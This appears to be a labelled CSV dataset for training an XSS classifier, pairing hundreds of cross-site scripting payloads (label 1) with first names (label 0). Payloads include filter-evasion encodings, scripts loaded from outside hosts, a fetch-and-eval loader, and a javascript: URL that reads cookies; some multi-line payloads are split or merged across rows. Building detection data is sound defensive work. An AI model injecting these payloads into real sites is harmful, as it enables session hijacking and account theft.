input,label
<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>,1
%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E,1
<<scr\0ipt/src=http://xss.com/xss.js></script,1
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",1
Gerome,0
Kaile,0
Pepita,0
Bruno,0
Nicky,0
Marcy,0
Quentin,0
Luce,0
Jayme,0
Tarrance,0
Ab,0
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"">",1
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",1
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
Bernita,0
Ronald,0
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
<svg%0Aonload=%09((pro\u006dpt))()//,1
<sCriPt x>(((confirm)))``</scRipt x>,1
"<w=""/x=""y>""/OndbLcLick=`<`[confir\u006d``]>z",1
"<A href=""javascript%26colon;confirm()"">click",1
<sVg oNloaD=write()>,1
Imojean,0
Twila,0
Emili,0
Rees,0
Jarib,0
Bearnard,0
Marcos,0
Meredeth,0
Angus,0
Vera,0
Sherye,0
Sidnee,0
Ellsworth,0
Barbi,0
Cody,0
Wilie,0
Leanor,0
Evangelia,0
Maurise,0
Armstrong,0
Shayna,0
Shari,0
Scottie,0
Brit,0
Germaine,0
Coralie,0
Belicia,0
<deTAiLs/open/oNtoGGle=confirm()>,1
"<scRiPt y=""><"">/*<sCRipt* */prompt()</script",1
Flory,0
Jean,0
Linet,0
Tami,0
Jen,0
Franny,0
Alonso,0
Joshua,0
Thaddus,0
Del,0
"<div id=""98""><div id=d><div style=""font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'"">X</div></div>",1
"<script>with(document.getElementById(""d""))innerHTML=innerHTML</script>//[""'`-->]]>]</div>",1
"<div id=""99"">XXX<style>",1
*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */,1
<!--,1
--><!--*{color:red}   /* all UA */,1
*{background:url(xx:x //**/\red/*)} /* IE 6-7 Standards mode */,1
"</style>//[""'`-->]]>]</div>",1
"<div id=""100""><img[a][b]src=x[d]onerror[c]=[e]""alert(100)"">//[""'`-->]]>]</div><div id=""101""><a href=""[a]java[b]script[c]:alert(101)"">XXX</a>//[""'`-->]]>]</div><div id=""102""><img src=""x` `<script>alert(102)</script>""` `>//[""'`-->]]>]</div><div id=""103""><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[""'`-->]]>]</div>",1
"<div id=""104""><svg xmlns=""http://www.w3.org/2000/svg"" id=""foo"">",1
"<x xmlns=""http://www.w3.org/2001/xml-events"" event=""load"" observer=""foo"" handler=""data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar""/>",1
Dorothee,0
Tris,0
Dolorita,0
Tomlin,0
Karel,0
Zita,0
Alfons,0
Kristien,0
"<xmp onclick=""alert(1)"">test</xmp>",1
"<xmp oncontextmenu=""alert(1)"">test</xmp>",1
"<xmp oncopy=""alert(1)"" contenteditable>test</xmp>",1
"<xmp oncut=""alert(1)"" contenteditable>test</xmp>",1
"<xmp ondblclick=""alert(1)"">test</xmp>",1
<xmp onfocusout=alert(1) tabindex=1 id=x></xmp><input autofocus>,1
Tomi,0
Ileane,0
Hester,0
Braden,0
Emanuele,0
Pen,0
Teresa,0
Merralee,0
Bethany,0
Vally,0
Timmie,0
L;urette,0
Wiatt,0
Rosalind,0
Gerick,0
Berne,0
"<xmp onbeforecopy=""alert(1)"" contenteditable>test</xmp>",1
"<xmp onbeforecut=""alert(1)"" contenteditable>test</xmp>",1
"<xmp onbeforepaste=""alert(1)"" contenteditable>test</xmp>",1
<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>,1
Gusella,0
Xenos,0
Agosto,0
Manuel,0
Dinnie,0
Salli,0
Jock,0
Alyson,0
"<xmp onkeydown=""alert(1)"" contenteditable>test</xmp>",1
"<xmp onkeypress=""alert(1)"" contenteditable>test</xmp>",1
"<xmp onkeyup=""alert(1)"" contenteditable>test</xmp>",1
"<xmp onmousedown=""alert(1)"">test</xmp>",1
Austina,0
Stern,0
Terry,0
Reggie,0
Elden,0
Kamillah,0
Annetta,0
Demetre,0
Way,0
Noami,0
Kordula,0
Christalle,0
Inger,0
Lee,0
Wenona,0
Marty,0
Major,0
Wallie,0
Cosimo,0
Herrick,0
Erskine,0
Lola,0
"<xmp onmouseenter=""alert(1)"">test</xmp>",1
"<xmp onmouseleave=""alert(1)"">test</xmp>",1
"<xmp onmousemove=""alert(1)"">test</xmp>",1
"<xmp onmouseout=""alert(1)"">test</xmp>",1
"<xmp onmouseover=""alert(1)"">test</xmp>",1
"<xmp onmouseup=""alert(1)"">test</xmp>",1
Herbert,0
Rosalynd,0
Dalila,0
Fan,0
Marley,0
Ximenes,0
Harp,0
Curtice,0
Goober,0
Giuseppe,0
Nichole,0
Harlen,0
Mireielle,0
Inge,0
Joby,0
Annabell,0
Orin,0
Lita,0
Jarad,0
Winthrop,0
Cirillo,0
</template>,1
"</stylesheet>//[""'`-->]]>]</div>",1
"<div id=""136""><form action="""" method=""post"">",1
"<input name=""username"" value=""admin"" />",1
"<input name=""password"" type=""password"" value=""secret"" />",1
"<a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlink:href=""?"">",1
"<circle r=""400""></circle>",1
Torrance,0
Ruthanne,0
Elliott,0
Christie,0
Demetrius,0
Gracia,0
"<input name=""injected"" value=""injected"" dirname=""password"" />",1
"<input type=""submit"">",1
"</form>//[""'`-->]]>]</div>",1
"<div id=""137""><svg>",1
Web,0
Caldwell,0
Fred,0
Forrester,0
Bunnie,0
Samara,0
Dora,0
Marielle,0
Roldan,0
Decca,0
Hollie,0
Lemmie,0
Marion,0
Adriena,0
Giffard,0
Merrie,0
Sebastien,0
<div style=xss:expression(alert(1))>,1
<div style=xss:expression(1)-alert(1)>,1
<div style=xss:expressio\6e(alert(1))>,1
<div style=xss:expressio&#x5c;6e(alert(1))>,1
<script>alert('XSS')</script>,1
Winn,0
Syd,0
Ryann,0
Janela,0
Elaina,0
Hall,0
Shelly,0
<div style=xss:expressio\006e(alert(1))>,1
<div style=xss:expressio\00006e(alert(1))>,1
Ignatius,0
Kristal,0
Marlie,0
Shep,0
Chloette,0
David,0
Lonnard,0
Sarine,0
Joana,0
Prent,0
Ryun,0
Delphinia,0
Charlean,0
"<!-- injection --><svg height=""50px"">",1
"<image xmlns:xlink=""http://www.w3.org/1999/xlink"">",1
"<set attributeName=""xlink:href"" begin=""accessKey(a)"" to=""//example.com/?a"" />",1
"<set attributeName=""xlink:href"" begin=""accessKey(b)"" to=""//example.com/?b"" />",1
"<set attributeName=""xlink:href"" begin=""accessKey(c)"" to=""//example.com/?c"" />",1
"<set attributeName=""xlink:href"" begin=""accessKey(d)"" to=""//example.com/?d"" />",1
</image>,1
Finley,0
Towney,0
Halette,0
Michale,0
Nelia,0
Cynthie,0
Eugenius,0
Gypsy,0
Victoir,0
Rodney,0
Hugues,0
Harper,0
Wynn,0
"<div onpointerover=""alert(45)"">MOVE HERE</div>",1
"<div onpointerdown=""alert(45)"">MOVE HERE</div>",1
"<div onpointerenter=""alert(45)"">MOVE HERE</div>",1
Rosalinda,0
Sheppard,0
Sherry,0
Gaston,0
Tito,0
Gawen,0
Shawnee,0
Vevay,0
Ophelie,0
Aretha,0
Alfonso,0
Bail,0
Corenda,0
Mile,0
<svg><script>alert('33'),1
<svg><script>alert&lpar;'33'&rpar;,1
<body onload=alert(/XSS/.source)>,1
<input autofocus onfocus=alert(1)>,1
Conant,0
Staci,0
Derrek,0
Derry,0
Dilan,0
Barnie,0
Lyssa,0
Perry,0
Feodora,0
Franklyn,0
Rani,0
<select autofocus onfocus=alert(1)>,1
<textarea autofocus onfocus=alert(1)>,1
<keygen autofocus onfocus=alert(1)>,1
<video/poster/onerror=alert(1)>,1
Kristine,0
Kaitlin,0
Fin,0
Quill,0
Bartholemy,0
Reginauld,0
Henrik,0
Orlan,0
Nikolaos,0
Ardith,0
Malory,0
Augusta,0
Joni,0
Claribel,0
Sergei,0
Renard,0
Mayer,0
Deirdre,0
Ignace,0
Berti,0
Wynnie,0
Marian,0
Huey,0
Susy,0
Emmi,0
Arleen,0
"<div onpointerleave=""alert(45)"">MOVE HERE</div>",1
"<div onpointermove=""alert(45)"">MOVE HERE</div>",1
"<div onpointerout=""alert(45)"">MOVE HERE</div>",1
"<div onpointerup=""alert(45)"">MOVE HERE</div>",1
Ransom,0
Gregoire,0
Rhianna,0
Tisha,0
Adan,0
Loralyn,0
Talya,0
Deanna,0
Shaun,0
Roddie,0
Dougy,0
Brady,0
Raffaello,0
Blake,0
Adorne,0
Salvador,0
Flin,0
Annora,0
Larissa,0
Jocelyne,0
Willey,0
Sella,0
Antoinette,0
Maisey,0
"family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"""">X</div>//[""""'`-->]]>]</div>",1
"<div id=""113""><div id=""x"">XXX</div>",1
"<style>#x{font-family:foo[bar;color:green;}#y];color:red;{}</style>//[""'`-->]]>]</div>",1
"<div id=""114""><x style=""background:url('x[a];color:red;/*')"">XXX</x>//[""'`-->]]>]</div>",1
"<div id=""115""><!--[if]><script>alert(115)</script -->",1
"<!--[if<img src=x onerror=alert(2)//]> -->//[""'`-->]]>]</div>",1
"<div id=""116""><div id=""x"">x</div>",1
Megen,0
Milzie,0
Nonah,0
Milka,0
Dodi,0
Robbi,0
Marieann,0
Benjamen,0
Sara,0
Silas,0
Nadia,0
Kirk,0
Gaile,0
<%78 onxxx=1,1
<x %6Fnxxx=1,1
<x o%6Exxx=1,1
<x on%78xx=1,1
<x onxxx%3D1,1
<X onxxx=1,1
<x OnXxx=1,1
<X OnXxx=1,1
Willyt,0
Nicola,0
Candy,0
Jarvis,0
Kelly,0
Aleen,0
Tanney,0
Bryan,0
Jillian,0
Brigit,0
Orran,0
Valaree,0
"Sauncho,0""<div id=""""110""""><svg xmlns=""""http://www.w3.org/2000/svg"""">",1
"<path d=""M0,0"" style=""marker-start:url(test4.svg#a)""/>",1
"</svg>//[""'`-->]]>]</div>",1
"<div id=""111""><div style=""background:url(/f#[a]oo/;color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div><div id=""112""><div style=""font
<xml:namespace prefix=""""t"""">",1
Georgeta,0
Mildred,0
Dunstan,0
Templeton,0
Hadleigh,0
Phip,0
Andria,0
Rea,0
Trisha,0
Graehme,0
Geordie,0
Vachel,0
Ladonna,0
Catharina,0
Tracey,0
"<div id=""122""><iframe sandbox=""allow-same-origin allow-forms allow-scripts"" src=""http://example.org/""></iframe>//[""'`-->]]>]</div>",1
"<div id=""123""><span class=foo>Some text</span>",1
"<a class=bar href=""http://www.example.org"">www.example.org</a>",1
"<script src=""http://code.jquery.com/jquery-1.4.4.js""></script>",1
Sarette,0
Walden,0
Calley,0
Bobbi,0
Annelise,0
Lindsey,0
Jillana,0
Adore,0
Bendick,0
Tove,0
Wye,0
Keir,0
Kenon,0
Correna,0
Benson,0
Gretal,0
Derek,0
Jorrie,0
Nels,0
"<div id=""132""><!doctype html>",1
<form>,1
"<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>",1
<br>,1
"<input name=""secret"" type=""password"">",1
</form>,1
"<div id=""133""><!-- `<img/src=xx:xx onerror=alert(133)//--!>//[""'`-->]]>]</div>",1
"<div id=""134""><xmp>",1
<%,1
</xmp>,1
<img alt='%></xmp><img src=xx:x onerror=aler,1
"*{color:red}</style>//[""'`-->]]>]</div>",1
"<div id=""135""><?xml-stylesheet type=""text/xsl"" href=""#"" ?>",1
"<stylesheet xmlns=""http://www.w3.org/TR/WD-xsl"">",1
"<template match=""/"">",1
Mignon,0
Leola,0
Sherman,0
Maximilien,0
Dore,0
Brade,0
Kiah,0
Stacy,0
Gerianna,0
Maggie,0
Moyna,0
Tammara,0
Caria,0
Norbert,0
Noam,0
Arabela,0
Agnola,0
Alyss,0
Antoni,0
Gerta,0
Brunhilda,0
Earl,0
Florella,0
Kare,0
"<script>$(""span.foo"").click(function() {alert('foo');$(""a.bar"").click();});$(""a.bar"").click(function() {alert('bar');location=""http://html5sec.org"";});</script>//[""'`-->]]>]</div>",1
"<div id=""124""><script src=""/\example.com\foo.js""></script> // Safari 5.0, Chrome 9, 10",1
"<script src=""\\example.com\foo.js""></script> // Safari 5.0//[""'`-->]]>]</div>",1
"<div id=""125""><?xml version=""1.0""?>",1
"<?xml-stylesheet type=""text/xml"" href=""#stylesheet""?>",1
Barnaby,0
Sallyanne,0
Ame,0
Denise,0
Joshuah,0
Beaufort,0
Arlena,0
Floris,0
Bernarr,0
August,0
Suzann,0
Shelden,0
Rodger,0
><svg/onload=alert(/XSS/),1
"<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)",1
"<video><source onerror=""javascript:alert(1)"">",1
"<video src=_ onloadstart=""alert(1)"">",1
"<details/open/ontoggle=""alert`1`"">",1
<audio src onloadstart=alert(1)>,1
<marquee onstart=alert(1)>,1
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>,1
"<svg/onload='fetch(""//host/a"").then(r=>r.text().then(t=>eval(t)))'>",1
<script src=14.rs>,1
Ulberto,0
Percy,0
Darnell,0
Fanechka,0
Cyndia,0
Xena,0
Kalie,0
Netty,0
Cull,0
Esmaria,0
Maximo,0
Michal,0
Tatiania,0
Florry,0
Eugine,0
Gib,0
Drugi,0
Miguel,0
Thekla,0
Saloma,0
Valeda,0
Lorita,0
Michail,0
Aida,0
Nathanial,0
"<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>",1
<img src=x:alert(alt) onerror=eval(src) alt=xss>,1
><img src=x onerror=alert('XSS');>,1
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>",1
<><img src=1 onerror=alert(1)>,1
Niles,0
Marrilee,0
Francklyn,0
Brittni,0
Celinka,0
Glenden,0
Bay,0
Philis,0
Jerry,0
Sybyl,0
Elena,0
Eberto,0
Ingmar,0
Hulda,0
Nady,0
Heidi,0
Levi,0
Erv,0
"<object/data=""jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;"">",1
<img src=x onerror=alert('XSS');>,1
<img src=x onerror=alert('XSS')//,1
"<img src=x onerror=alert(String.fromCharCode(88,83,83));>",1
Torrence,0
Vinny,0
Emmerich,0
Andrea,0
Lorelle,0
Ginnie,0
Roderic,0
Nanci,0
Bradly,0
Shalna,0
Teena,0
"</a>//[""'`-->]]>]</div>",1
"<div id=""138""><link rel=""import"" href=""test.svg"" />//[""'`-->]]>]</div><div id=""139""><iframe srcdoc=""&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;"" />//[""'`-->]]>]</div>undefined",1
<marquee loop=1 width=0 onfinish=alert(1)>,1
<marguee/onstart=alert(1)>,1
<svg onload=(alert)(1)>,1
"<script>$=1,alert($)</script>",1
<script>eval('\x61lert(\'33\')')</script>,1
"<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt(""confirm"",30) == 8680439 && 8680439..toString(30) == ""confirm",1
<svgonload=alert(1)>,1
Corilla,0
Quincy,0
Yorgos,0
Vergil,0
Nolana,0
Hubert,0
Dulcinea,0
Nedda,0
Yvon,0
Florrie,0
Emelina,0
Talia,0
Jayson,0
Dasie,0
Olympe,0
Davide,0
Egor,0
Eloise,0
Shannan,0
Mano,0
Ulric,0
Delila,0
Jephthah,0
Chrysler,0
Kennan,0
Marja,0
<eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(135)</eval>,1
"<if expr=""new ActiveXObject('htmlfile').parentWindow.alert(2)""></if>",1
"<animate attributeName=""xlink:href"" begin=""0"" from=""javascript:alert(137)"" to=""&"" />",1
<svg/onload=alert('XSS')>,1
<svg onload=alert(1)//,1
"<svg/onload=alert(String.fromCharCode(88,83,83))>",1
<svg id=alert(1) onload=eval(id)>,1
"><svg/onload=alert(String.fromCharCode(88,83,83))>",1
Dagny,0
Constantina,0
Jannelle,0
Normie,0
Danika,0
Brooks,0
Rhody,0
Gregoor,0
El,0
Lonna,0
Tallou,0
Marsh,0
Abdul,0
Holden,0
Dillie,0
Addison,0
Cheslie,0
"<image style='filter:url(""data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>"")'>",1
"<div id=""130""><math href=""javascript:alert(130)"">CLICKME</math>",1
<math>,1
"<maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:alert(2)"">CLICKME</maction>",1
"<maction actiontype=""statusline"" xlink:href=""javascript:alert(3)"">CLICKME<mtext>http://http://google.com</mtext></maction>",1
"</math>//[""'`-->]]>]</div>",1
"<div id=""131""><b>drag and drop one of the following strings to the drop box:</b>",1
<br/><hr/>jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>,1
